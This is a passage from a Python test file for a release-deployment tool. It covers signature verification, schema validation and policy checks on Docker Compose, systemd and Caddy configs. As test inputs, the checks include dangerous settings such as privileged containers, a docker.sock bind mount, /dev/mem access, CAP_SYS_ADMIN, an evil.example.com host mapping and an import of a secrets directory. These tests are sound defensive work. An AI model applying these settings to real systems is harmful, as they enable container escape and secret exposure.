    def test_verify_command(self):
        self.bootstrap()
        self.next_release().build(self.m, signers=("evil:release-a",))
        self.m.index(2)
        self.ok(self.e.run("fetch"), 10)
        res = self.ok(self.e.run("verify", "--release", "1.1.0"), 10)
        self.assertEqual(res["code"], "manifest-signature")


# --- schemas and static checks ---------------------------------------------------------------------
class SchemaTests(unittest.TestCase):
    def setUp(self):
        self.e = Env()

    def tearDown(self):
        self.e.close()

    def test_documents_valid_and_mutations_rejected(self):
        m = self.e.mirror
        r = Release("1.0.0", 1, "security")
        r.build(m)
        m.attestation("1.0.0")
        m.promote("1.0.0", "early")
        m.promote("1.0.0", "stable")
        index = json.loads(m.index(1))
        docs = {
            "manifest": json.loads(r.manifest_bytes),
            "index": index,
            "attestation": load(os.path.join(m.root, "releases/1.0.0/attest/canary.json")),
            "promotion": load(os.path.join(m.root, "releases/1.0.0/promote/stable.json")),
            "policy": self.e.policy,
        }
        for kind, doc in docs.items():
            self.assertEqual(schema.validate(kind, doc), [], kind)
        bad = [
            ("manifest", lambda d: d.update(sequence=0)),
            ("manifest", lambda d: d.update(rollback="db-restore")),
            ("manifest", lambda d: d["artifacts"][0].update(sha256="xyz")),
            ("manifest", lambda d: d.update(advisories=[])),
            ("manifest", lambda d: d["egress"]["roles"]["app"].append({"host": "1.2.3.4", "port": 443,
                                                                        "purpose": "ip"})),
            ("manifest", lambda d: d.update(channels=["stable"])),
            ("manifest", lambda d: d.update(extra=True)),
            ("index", lambda d: d.update(schema="legatto-index/2")),
            ("index", lambda d: d["releases"][0].update(yanked=True)),
            ("promotion", lambda d: d.pop("early_promotion_sha256")),
            ("promotion", lambda d: d.update(channel="canary")),
            ("attestation", lambda d: d.update(result="FAIL")),
            ("policy", lambda d: d["min_delay_hours"]["feature"].update(stable=1)),
            ("policy", lambda d: d.update(env="prod")),
            ("policy", lambda d: d.update(signatures_required=0)),
        ]
        for kind, mutate in bad:
            doc = json.loads(json.dumps(docs[kind]))
            mutate(doc)
            self.assertNotEqual(schema.validate(kind, doc), [], "%s mutation accepted" % kind)

    def test_validator_supports_every_keyword(self):
        for kind in schema.SCHEMA_FILES:
            schema.load(kind)  # raises SchemaError on an unsupported keyword


class CheckTests(unittest.TestCase):
    def config(self):
        r = Release("1.0.0", 1)
        r.app_digest = "sha256:" + "a" * 64
        cfg = r.compose_config("sha256:" + "b" * 64)
        text = json.dumps(cfg).replace("@COMPOSE@", "/opt/legatto/releases/1.0.0/compose").replace("@ROOT@", "")
        manifest = {"images": [{"ref": "docker.io/legatto/app:1.0.0", "digest": "sha256:" + "a" * 64},
                               {"ref": "docker.io/supabase/postgres:17", "digest": "sha256:" + "b" * 64}]}
        return json.loads(text), manifest

    def errors(self, mutate):
        cfg, manifest = self.config()
        mutate(cfg)
        office = {"LEGATTO_HOST_CRM": "app.example.test", "LEGATTO_TS_IP4": "100.64.0.1"}
        return check.check_compose_config(cfg, manifest, office, "/opt/legatto/releases/1.0.0/compose")

    def test_compose_policy(self):
        self.assertEqual(self.errors(lambda c: None), [])
        cases = {
            "privileged": lambda c: c["services"]["app"].update(privileged=True),
            "network_mode": lambda c: c["services"]["app"].update(network_mode="host"),
            "pid": lambda c: c["services"]["app"].update(pid="host"),
            "port": lambda c: c["services"]["app"]["ports"][0].update(host_ip="0.0.0.0"),
            "cap_add": lambda c: c["services"]["app"].update(cap_add=["NET_ADMIN"]),
            "bind mount": lambda c: c["services"]["db"]["volumes"].append(
                {"type": "bind", "source": "/var/run/docker.sock", "target": "/s", "read_only": True}),
            "read-only": lambda c: c["services"]["db"]["volumes"][0].update(read_only=False),
            "image": lambda c: c["services"]["app"].update(image="docker.io/legatto/app:latest"),
            "manifest.images": lambda c: c["services"]["app"].update(image="docker.io/legatto/app@sha256:" + "c" * 64),
            "extra_hosts": lambda c: c["services"]["app"].update(extra_hosts=["evil.example.com=203.0.113.9"]),
            "not in contract": lambda c: c["networks"].update(evil={"name": "bridge"}),
            "driver_opts": lambda c: c["volumes"]["db-data"].update(driver_opts={"type": "none", "device": "/"}),
            "devices": lambda c: c["services"]["app"].update(devices=["/dev/mem"]),
        }
        disabled = {"image": "docker.io/supabase/imgproxy:v3", "profiles": ["disabled"],
                    "volumes": [{"type": "bind", "source": "./volumes/storage", "target": "/s"}]}
        self.assertEqual(self.errors(lambda c: c["services"].update(imgproxy=disabled)), [])
        cases["profile disabled"] = lambda c: (c["services"].update(imgproxy=disabled),
                                               c["services"]["app"].update(depends_on={"imgproxy": {}}))
        for word, mutate in cases.items():
            errs = self.errors(mutate)
            self.assertTrue(any(word in e for e in errs), "%s not detected: %s" % (word, errs))

    def test_units(self):
        ok = "[Service]\nUser=legatto-mon\nExecStart=/opt/legatto/bin/current/caddy run\n"
        self.assertEqual(check.check_unit("legatto-cron-x.timer", "[Timer]\nOnCalendar=daily\n"), [])
        self.assertEqual(check.check_unit("legatto-stack.service", "[Service]\nExecStart=/opt/legatto/sbin/legatto-stack up\n"), [])
        self.assertTrue(check.check_unit("legatto-cron@.service", ok))  # DynamicUser required
        self.assertTrue(check.check_unit("sshd.service", ok))
        self.assertTrue(check.check_unit("legatto-stack.service", "[Service]\nExecStart=/usr/bin/docker compose up\n"))
        self.assertTrue(check.check_unit("legatto-stack.service", "[Service]\nExecStart=+/opt/legatto/sbin/x\n"))
        self.assertTrue(check.check_unit("legatto-cron@.service",
                                         "[Service]\nDynamicUser=yes\nAmbientCapabilities=CAP_SYS_ADMIN\n"
                                         "ExecStart=/opt/legatto/sbin/legatto-stack cron %i\n"))

    def test_caddy_sites(self):
        self.assertEqual(check.check_caddy_site("crm.caddy", "reverse_proxy 172.30.0.10:3000\nimport headers\n"), [])
        self.assertTrue(check.check_caddy_site("crm.caddy", "bind 0.0.0.0\n"))
        self.assertTrue(check.check_caddy_site("crm.caddy", ":8080 {\n  respond ok\n}\n"))
        self.assertTrue(check.check_caddy_site("crm.caddy", "import /etc/legatto/secrets/*\n"))


if __name__ == "__main__":
    unittest.main(verbosity=2)
